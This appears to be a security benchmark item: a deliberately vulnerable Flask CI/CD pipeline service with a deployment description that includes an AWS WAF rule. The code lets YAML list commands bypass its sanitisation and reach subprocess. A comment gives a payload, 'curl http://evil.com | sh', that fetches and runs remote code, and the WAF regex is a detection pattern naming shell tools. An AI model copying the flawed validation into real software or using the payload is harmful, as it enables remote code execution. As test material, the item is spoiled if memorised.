@@ -1,0 +1,37 @@
+{
+  "id": "793603c3",
+  "language": "python",
+  "code": "import json\nimport yaml\nimport subprocess\nimport os\nfrom flask import Flask, request, jsonify\n\napp = Flask(__name__)\n\nclass PipelineConfig:\n    \"\"\"CI/CD Pipeline plugin that processes build configurations\"\"\"\n    \n    def __init__(self):\n        self.allowed_builders = ['docker', 'maven', 'gradle', 'npm']\n        self.max_steps = 50\n    \n    def parse_config(self, raw_config, content_type):\n        \"\"\"Parse pipeline configuration from multiple formats\"\"\"\n        if content_type == 'application/json':\n            return json.loads(raw_config)\n        elif content_type in ('application/x-yaml', 'text/yaml'):\n            return yaml.safe_load(raw_config)\n        else:\n            # Fallback: try JSON first, then YAML\n            try:\n                return json.loads(raw_config)\n            except (json.JSONDecodeError, TypeError):\n                return yaml.safe_load(raw_config)\n    \n    def validate_step(self, step):\n        \"\"\"Validate a single pipeline step - type confusion vulnerability here\"\"\"\n        # Developer assumes step['command'] is always a string\n        # but YAML deserialization can produce other types\n        if isinstance(step, dict) and 'command' in step:\n            command = step['command']\n            # Type confusion: if command is a list, it bypasses the string check\n            # and gets passed directly to subprocess\n            if isinstance(command, str):\n                # String commands get shell=False treatment with split\n                if any(dangerous in command for dangerous in [';', '&&', '||', '`', '$(',]):\n                    return None, \"Dangerous characters in command\"\n                return command.split(), None\n            elif isinstance(command, list):\n                # Lists bypass the dangerous character check entirely\n                # This is the type confusion - YAML can deserialize:\n                #   command: [\"sh\", \"-c\", \"curl http://evil.com | sh\"]\n                # which bypasses the string sanitization above\n                return command, None\n            elif isinstance(command, dict):\n                # Dict with 'run' key - another type confusion path\n                if 'run' in command:\n                    return command['run'] if isinstance(command['run'], list) else command['run'].split(), None\n        return None, \"Invalid step format\"\n    \n    def execute_step(self, validated_command):\n        \"\"\"Execute a validated pipeline step\"\"\"\n        try:\n            result = subprocess.run(\n                validated_command,\n                capture_output=True,\n                text=True,\n                timeout=300,\n                cwd='/tmp/workspace'\n            )\n            return {'exit_code': result.returncode, 'stdout': result.stdout, 'stderr': result.stderr}\n        except subprocess.TimeoutExpired:\n            return {'exit_code': -1, 'error': 'timeout'}\n        except Exception as e:\n            return {'exit_code': -1, 'error': str(e)}\n\npipeline = PipelineConfig()\n\n@app.route('/api/v2/pipeline/trigger', methods=['POST'])\ndef trigger_pipeline():\n    \"\"\"Endpoint to trigger a pipeline build with inline config\"\"\"\n    content_type = request.content_type or 'application/json'\n    raw_body = request.get_data(as_text=True)\n    \n    config = pipeline.parse_config(raw_body, content_type)\n    \n    if not config or 'steps' not in config:\n        return jsonify({'error': 'Invalid pipeline config'}), 400\n    \n    results = []\n    for i, step in enumerate(config['steps']):\n        validated_cmd, error = pipeline.validate_step(step)\n        if error:\n            results.append({'step': i, 'error': error})\n            continue\n        \n        result = pipeline.execute_step(validated_cmd)\n        results.append({'step': i, 'result': result})\n        \n        if result.get('exit_code', 0) != 0:\n            break\n    \n    return jsonify({'pipeline_run': results})\n\n@app.route('/api/v2/pipeline/validate', methods=['POST'])\ndef validate_pipeline():\n    \"\"\"Validate pipeline config without executing\"\"\"\n    content_type = request.content_type or 'application/json'\n    raw_body = request.get_data(as_text=True)\n    \n    config = pipeline.parse_config(raw_body, content_type)\n    \n    if not config or 'steps' not in config:\n        return jsonify({'valid': False, 'error': 'Missing steps'}), 400\n    \n    errors = []\n    for i, step in enumerate(config['steps']):\n        _, error = pipeline.validate_step(step)\n        if error:\n            errors.append({'step': i, 'error': error})\n    \n    return jsonify({'valid': len(errors) == 0, 'errors': errors})\n\nif __name__ == '__main__':\n    os.makedirs('/tmp/workspace', exist_ok=True)\n    app.run(host='0.0.0.0', port=8080)",
+  "environment": {
+    "description": "Same pipeline plugin deployed on ECS Fargate behind an Application Load Balancer (ALB) in us-west-2. The ALB has an AWS WAFv2 WebACL (arn:aws:wafv2:us-west-2:123456789012:regional/webacl/cicd-protection/a1b2c3d4) attached with the following rule groups evaluated in priority order: (1) AWS-AWSManagedRulesCommonRuleSet at priority 100 with SizeRestriction_BODY rule in COUNT mode only, (2) a custom rule group 'cicd-body-inspection' at priority 200 that applies a regex pattern set matching on request body for YAML sequences containing executable paths (pattern: '\\[\\s*[\"\\x27]?(/bin/|/usr/bin/|sh|bash|curl|wget|python)') with action BLOCK and TextTransformation NONE applied to Body with OversizeHandling MATCH, (3) AWS-AWSManagedRulesKnownBadInputsRuleSet at priority 300 in default BLOCK mode. The task runs with a read-only root filesystem and the /tmp/workspace is an ephemeral volume. The task IAM role has no permissions beyond ECR pull and CloudWatch Logs.",
+    "config": {
+      "load_balancer": "ALB with WAFv2 WebACL attached",
+      "waf_web_acl": "arn:aws:wafv2:us-west-2:123456789012:regional/webacl/cicd-protection/a1b2c3d4",
+      "waf_rules": [
+        {
+          "priority": 100,
+          "name": "AWS-AWSManagedRulesCommonRuleSet",
+          "override": "SizeRestriction_BODY set to COUNT"
+        },
+        {
+          "priority": 200,
+          "name": "cicd-body-inspection",
+          "type": "custom_rule_group",
+          "description": "Regex pattern set on Body field matching YAML array sequences with executable paths",
+          "pattern": "\\[\\s*[\"']?(/bin/|/usr/bin/|sh|bash|curl|wget|python)",
+          "action": "BLOCK",
+          "text_transformation": "NONE",
+          "oversize_handling": "MATCH"
+        },
+        {
+          "priority": 300,
+          "name": "AWS-AWSManagedRulesKnownBadInputsRuleSet",
+          "action": "BLOCK"
+        }
+      ],
+      "filesystem": "read-only root, ephemeral /tmp/workspace",
+      "task_role": "arn:aws:iam::123456789012:role/pipeline-task-readonly",
+      "network": "Private subnet, ALB in public subnet"
+    }
+  }
+}
